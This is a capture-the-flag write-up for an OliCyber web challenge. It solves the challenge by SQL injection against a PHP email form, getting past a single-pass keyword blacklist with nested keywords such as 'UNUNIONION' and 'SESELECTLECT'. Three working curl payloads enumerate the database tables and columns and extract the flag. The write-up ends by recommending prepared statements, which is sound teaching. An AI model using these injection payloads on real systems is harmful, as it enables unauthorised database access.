# If you have no time, just don't wait

**Competition:** OliCyber <br>
**Category:** Web <br>
**URL:** http://no-time.challs.olicyber.it

---

## Description
> This site promises to give me a flag, but I'd have to wait too long...

A "Coming Soon" site with a form to subscribe via email. The backend inserts the email into a MySQL database and the flag is stored in a hidden table.

---

## Solution

### 1. Initial reconnaissance

The source is available at `database.php?show_source`. The query is:

```php
$query = "SELECT email FROM emails WHERE email = '$email'";
```

User input is inserted directly into the query → **SQL Injection**.

### 2. Vulnerability — SQLi with bypassable blacklist

The backend applies a blacklist using `preg_replace`:

```php
$blacklist = array('SELECT','INSERT','UNION','DELETE','ALL','WHERE','FROM','FLAG','LIMIT','OFFSET');
foreach ($blacklist as $blocked){
    $email = preg_replace("/$blocked/i", '', $email);
}
```

By inserting a blocked keyword inside itself, after removal the original keyword can remain:

| Input | After sanitize |
|-------|----------------|
| `UNUNIONION` | `UNION` |
| `SESELECTLECT` | `SELECT` |
| `FRFROMOM` | `FROM` |
| `WHERWHEREE` | `WHERE` |
| `flFLAGag` | `flag` |

To bypass the `flag` token in table/column names, use `flFLAGag` (the `FLAG` portion is removed, leaving `flag`).

### 3. Exploit

Step 1 — enumerate tables:

```bash
curl -s -X POST "http://no-time.challs.olicyber.it/database.php" \
  -d "email=' AND 1=2 UNUNIONION SESELECTLECT group_concat(table_name) FRFROMOM information_schema.tables-- -"
```

Result: `emails, qua_trovi_la_tua_flag, ...`

Step 2 — enumerate columns (use hex for the table name to avoid quote issues):

```bash
curl -s -X POST "http://no-time.challs.olicyber.it/database.php" \
  -d "email=' AND 1=2 UNUNIONION SESELECTLECT group_concat(column_name) FRFROMOM information_schema.columns WHERWHEREE table_name=0x7175615f74726f76695f6c615f7475615f666c6167-- -"
```

Result: `la_flag_sta_qua`

Step 3 — read the flag (bypass `flag` using `flFLAGag`, use backticks for the table name):

```bash
curl -s -X POST "http://no-time.challs.olicyber.it/database.php" \
  -d "email=' AND 1=2 UNUNIONION SESELECTLECT la_flFLAGag_sta_qua FRFROMOM \`qua_trovi_la_tua_flFLAGag\`-- -"
```

---

## Flag

```
flag{...}
```

---

## Conclusions

The `preg_replace` based blacklist is bypassable with nested keywords. Because the removal is applied only once and not recursively, embedding a blocked keyword inside itself reconstructs the original after sanitization.

**Correct fix:** use prepared statements with `PDO::prepare()` and `bindParam()` for all user inputs; never build queries by string concatenation.
